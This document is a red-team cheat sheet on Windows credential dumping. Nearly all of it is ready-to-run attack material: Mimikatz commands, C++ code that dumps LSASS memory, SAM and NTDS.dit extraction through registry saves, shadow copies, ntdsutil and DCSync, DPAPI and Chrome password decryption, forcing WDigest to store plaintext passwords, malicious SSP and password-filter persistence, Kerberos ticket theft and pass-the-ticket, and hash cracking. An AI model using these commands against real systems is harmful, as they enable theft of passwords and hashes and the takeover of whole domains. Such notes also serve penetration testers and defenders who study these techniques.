# Credential Access & Dumping Techniques

## Overview
Credential dumping extracts authentication material from memory, registry, and files. Targets include LSASS process memory, SAM database, NTDS.dit, and cached credentials.

*Source: Based on ired.team red team notes*

---

## LSASS Memory Dumping

### Mimikatz (Standard Method)
```powershell
# Dump credentials from LSASS
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords

# Dump specific credential types
mimikatz# sekurlsa::wdigest
mimikatz# sekurlsa::kerberos
mimikatz# sekurlsa::msv
mimikatz# sekurlsa::credman
```

### MiniDumpWriteDump (LOLBIN Method)
Dump LSASS using legitimate Windows APIs.

```cpp
#include <windows.h>
#include <dbghelp.h>

// Get LSASS PID
DWORD lsassPid = 0;
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 pe;
pe.dwSize = sizeof(pe);
if (Process32First(hSnapshot, &pe)) {
    do {
        if (lstrcmpiA(pe.szExeFile, "lsass.exe") == 0) {
            lsassPid = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));
}

// Open LSASS and create dump
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPid);
HANDLE hFile = CreateFile("lsass.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
MiniDumpWriteDump(hProcess, lsassPid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
```

### Task Manager Method (GUI)
1. Open Task Manager as Administrator
2. Find lsass.exe in Details tab
3. Right-click → Create dump file
4. Analyze dump offline with Mimikatz

```powershell
# Analyze dump offline
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonpasswords
```

### comsvcs.dll Method
```cmd
# Find LSASS PID
tasklist /FI "IMAGENAME eq lsass.exe"

# Dump using rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\temp\lsass.dmp full
```

### ProcDump (Sysinternals)
```cmd
procdump.exe -ma lsass.exe lsass.dmp
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

---

## SAM Database Dumping

### Registry Export Method
```cmd
# Save SAM and SYSTEM hives
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

# Extract hashes with secretsdump
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

### esentutl.exe (Living Off the Land)
```cmd
# Copy locked SAM file
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d C:\temp\sam

# Also copy SYSTEM for decryption key
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d C:\temp\system
```

### Volume Shadow Copy
```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Copy SAM from shadow
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
```

### Mimikatz
```powershell
mimikatz# privilege::debug
mimikatz# token::elevate
mimikatz# lsadump::sam
```

---

## Domain Controller Hash Extraction

### NTDS.dit Dumping

**Shadow Copy Method:**
```cmd
# Create shadow copy
wmic shadowcopy call create volume='C:\'

# List shadow copies
vssadmin list shadows

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM

# Extract hashes
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

**ntdsutil Method:**
```cmd
ntdsutil "activate instance ntds" "ifm" "create full C:\temp\ntds" quit quit
```

**Mimikatz DCSync:**
```powershell
# Dump specific user
mimikatz# lsadump::dcsync /domain:domain.local /user:Administrator

# Dump all users
mimikatz# lsadump::dcsync /domain:domain.local /all /csv

# Using secretsdump
secretsdump.py domain.local/admin:password@dc01.domain.local
```

### DCSync Requirements
- Replicating Directory Changes permission
- Replicating Directory Changes All permission
- Typically: Domain Admins, Enterprise Admins, DC computer accounts

---

## Cached Credentials

### MSCASH / Domain Cached Credentials
```powershell
# Using Mimikatz
mimikatz# lsadump::cache

# Dump from registry
reg save HKLM\SECURITY security.save
reg save HKLM\SYSTEM system.save

# Extract with secretsdump
secretsdump.py -security security.save -system system.save LOCAL
```

**Cracking DCC2 Hashes:**
```bash
# Hashcat mode 2100
hashcat -m 2100 dcc2_hashes.txt wordlist.txt
```

---

## LSA Secrets

Contains service account passwords, auto-logon credentials, VPN passwords.

```powershell
# Mimikatz
mimikatz# lsadump::secrets

# From backup
secretsdump.py -security security.save -system system.save LOCAL
```

---

## DPAPI Secrets

### Master Key Extraction
```powershell
# Find master keys
mimikatz# dpapi::masterkey /in:"C:\Users\user\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>" /rpc

# Decrypt Chrome passwords
mimikatz# dpapi::chrome /in:"C:\Users\user\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

### Credential Manager
```powershell
# List credentials
cmdkey /list

# Mimikatz extraction
mimikatz# vault::cred
mimikatz# vault::list
```

---

## Registry Credentials

### Common Locations
```cmd
# Auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKCU\Software\TightVNC\Server"

# PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Saved RDP credentials
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
```

### Unattended Installation Files
```powershell
# Common locations
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\System32\Sysprep\Unattend.xml
C:\Windows\System32\Sysprep\sysprep.xml

# Search for passwords
findstr /si password *.xml *.ini *.txt *.config
```

---

## Credential Interception

### WDigest Plaintext Credentials
Force plaintext password storage in memory.

```powershell
# Enable WDigest (requires reboot/re-login)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# Check status
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

### Custom SSP (Security Support Provider)
Intercept credentials at login.

```cpp
// mimilib.dll - Logs passwords to file
// Copy to C:\Windows\System32\
// Add to registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```

```powershell
# Add SSP via registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib"
```

### Password Filter DLL
Capture passwords during change operations.

```cpp
// Implement PasswordFilter export
BOOLEAN NTAPI PasswordFilter(
    PUNICODE_STRING AccountName,
    PUNICODE_STRING FullName,
    PUNICODE_STRING Password,
    BOOLEAN SetOperation
) {
    // Log Password to file
    return TRUE;
}
```

---

## Kerberos Ticket Extraction

### Export Tickets
```powershell
# Mimikatz - export all tickets
mimikatz# sekurlsa::tickets /export

# Rubeus
Rubeus.exe dump

# klist
klist
```

### Pass-the-Ticket
```powershell
# Mimikatz
mimikatz# kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:base64_ticket
```

---

## Tools Reference

| Tool | Purpose |
|------|---------|
| Mimikatz | Comprehensive credential extraction |
| secretsdump.py | Offline hash extraction |
| pypykatz | Python Mimikatz implementation |
| LaZagne | Multi-application password recovery |
| SharpDPAPI | DPAPI credential extraction |
| Rubeus | Kerberos ticket operations |
| Impacket | Remote credential dumping |
| CrackMapExec | Network-wide credential testing |
